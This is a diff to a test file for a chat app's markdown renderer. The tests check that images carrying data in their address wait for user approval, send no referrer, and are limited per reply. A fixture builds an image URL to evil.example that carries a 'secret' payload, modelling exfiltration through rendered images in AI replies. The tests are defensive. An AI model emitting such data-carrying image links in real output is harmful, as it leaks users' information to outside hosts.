@@ -4,6 +4,7 @@ import { createRoot, type Root } from "react-dom/client";
 import { TextMessagePartProvider } from "@assistant-ui/react";
 
 import { installDom } from "@/test/dom";
+import { IMAGE_PROMPT_COPY } from "@/lib/imageUrlFilter";
 import { MarkdownText } from "./markdown-text";
 
 let restore: (() => void) | undefined;
@@ -15,12 +16,8 @@ afterEach(() => {
   restore = undefined;
 });
 
-async function reply(text: string) {
-  restore = installDom();
-  const host = document.createElement("div");
-  document.body.append(host);
-  const root = createRoot(host);
-  mounted = root;
+async function show(root: Root, text: string, host: HTMLElement) {
+  const deadline = Date.now() + 3000;
   await act(async () =>
     root.render(
       <TextMessagePartProvider text={text} isRunning={false}>
@@ -28,7 +25,21 @@ async function reply(text: string) {
       </TextMessagePartProvider>,
     ),
   );
-  await act(async () => { for (let i = 0; i < 4; i++) await Promise.resolve(); });
+  // The Markdown primitive reveals new text a few characters per animation frame: wait until the page stops changing.
+  let last = "";
+  for (let stable = 0; stable < 4 && Date.now() < deadline; ) {
+    await act(async () => { await Bun.sleep(20); });
+    stable = host.innerHTML === last ? stable + 1 : 0;
+    last = host.innerHTML;
+  }
+}
+
+async function reply(text: string) {
+  restore = installDom();
+  const host = document.createElement("div");
+  document.body.append(host);
+  mounted = createRoot(host);
+  await show(mounted, text, host);
   return host;
 }
 
@@ -36,6 +47,7 @@ const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
 const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
 const buttonNamed = (host: HTMLElement, name: string) =>
   [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;
+const IMAGE_ADDRESS = (tail: string) => `https://evil.example/p.png?d=${"secret".repeat(14)}${tail}`;
 
 test("a reply's normal image loads without asking", async () => {
   const host = await reply("![logo](https://i.imgur.com/AbCd123.png)");
@@ -46,18 +58,19 @@ test("a reply's normal image loads without asking", async () => {
 test("an image address that carries data shows the host and full address, with no img until Load", async () => {
   const host = await reply(`![chart](${carrier})`);
   expect(host.querySelector("img")).toBeNull();
-  expect(host.textContent).toContain("Load image from evil.example?");
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.why("evil.example"));
   expect(host.textContent).toContain(carrier);
-  await click(buttonNamed(host, "Load"));
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
   expect(host.querySelector("img")?.getAttribute("src")).toBe(carrier);
 });
 
 test("Not now leaves the image's description and no img", async () => {
   const host = await reply(`![chart](${carrier})`);
-  await click(buttonNamed(host, "Not now"));
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
   expect(host.querySelector("img")).toBeNull();
   expect(host.querySelector("button")).toBeNull();
-  expect(host.textContent).toContain("chart");
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("chart"));
 });
 
 test("a data: image never loads and never asks", async () => {
@@ -70,6 +83,66 @@ test("a link in a reply sends no referrer and no opener", async () => {
   const host = await reply("[docs](https://example.com/docs)");
   const link = host.querySelector("a")!;
   expect(link.getAttribute("href")).toBe("https://example.com/docs");
-  expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
+  expect(link.getAttribute("rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
   expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
+});
+
+test("an image that loads sends no referrer", async () => {
+  const host = await reply(`![chart](https://i.imgur.com/AbCd123.png)\n\n![big](${carrier})`);
+  expect(host.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
+  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("referrerpolicy"))).toEqual(["no-referrer", "no-referrer"]);
+});
+
+test("Load approves the address the reader saw: if the address changes under the same image, it asks again", async () => {
+  const a = IMAGE_ADDRESS("A");
+  const b = IMAGE_ADDRESS("B");
+  const host = await reply(`![chart](${a})`);
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
+  expect(host.querySelector("img")?.getAttribute("src")).toBe(a);
+  await show(mounted!, `![chart](${b})`, host);
+  expect(host.querySelector("img")).toBeNull();
+  expect(host.textContent).toContain(b);
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
+  expect(host.querySelector("img")?.getAttribute("src")).toBe(b);
+});
+
+const photo = (host: string, name = "p") => `![${name}](https://${host}/${name}.png)`;
+const waiting = (host: HTMLElement) => host.querySelectorAll("img").length;
+
+test("a reply's images from other hosts: two load, the rest wait for one prompt for the whole reply", async () => {
+  const host = await reply(["a.example", "b.example", "c.example", "d.example"].map((h) => photo(h)).join("\n\n"));
+  expect(waiting(host)).toBe(2);
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.waiting("p"));
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, ["c.example", "d.example"]));
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.why);
+  expect(host.querySelectorAll("button").length).toBe(2); // one prompt: Load and Not now
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
+  expect(waiting(host)).toBe(4);
+  expect(host.querySelector("button")).toBeNull();
+});
+
+test("Not now on the reply's prompt leaves the held images as descriptions and asks no more", async () => {
+  const host = await reply(["a", "b", "c", "d"].map((h) => photo(`${h}.example`)).join("\n\n"));
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
+  expect(waiting(host)).toBe(2);
+  expect(host.querySelector("button")).toBeNull();
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
+});
+
+test("our own hosts do not use the reply's budget", async () => {
+  const own = [1, 2, 3, 4].map((n) => photo("node.tinycloud.xyz", `n${n}`)).join("\n\n");
+  const host = await reply(`${own}\n\n${photo("a.example")}\n\n${photo("b.example")}`);
+  expect(waiting(host)).toBe(6);
+  expect(host.querySelector("button")).toBeNull();
+});
+
+test("an approval covers the addresses it named: an image added to the reply afterwards waits again", async () => {
+  const four = ["a", "b", "c", "d"].map((h) => photo(`${h}.example`)).join("\n\n");
+  const host = await reply(four);
+  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
+  expect(waiting(host)).toBe(4);
+  await show(mounted!, `${four}\n\n${photo("e.example")}`, host);
+  expect(waiting(host)).toBe(4);
+  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["e.example"]));
 });
